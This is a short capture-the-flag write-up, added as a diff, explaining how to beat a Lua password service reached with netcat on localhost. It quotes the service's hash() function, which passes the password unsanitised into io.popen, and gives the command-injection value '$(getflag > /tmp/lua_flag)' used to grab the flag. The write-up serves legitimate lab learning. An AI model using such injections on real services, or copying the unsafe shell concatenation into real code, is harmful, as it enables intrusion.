@@ -1,0 +1,23 @@
+On shell, launch (to open connection, not listen for connections this time) : `nc 127.0.0.1 5151`
+This way we can send back data to the lua script (running in the background, on its own).
+
+When asked for the password, we can execute shell commands and retrieve the flag.
+In the lua file, it is handled by the `io.popen()` function inside the `hash()` function, which is used to launch shell commands :
+"function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r") [HERE]
+  data = prog:read("*all")
+  prog:close()
+
+  data = string.sub(data, 1, 40)
+
+  return data
+end"
+
+We can pass the getflag command as the "pass" arg, like so :
+=> Output (after launching netcat) :
+"Password : $(getflag > /tmp/lua_flag)"
+"Erf, no ..."
+
+But it works ! Just `cat /tmp/lua_flag`, and retrieve the flag to log in as level12 (no need to log as flag11 this time).
+
+See : https://www.gammon.com.au/scripts/doc.php?lua=io.popen
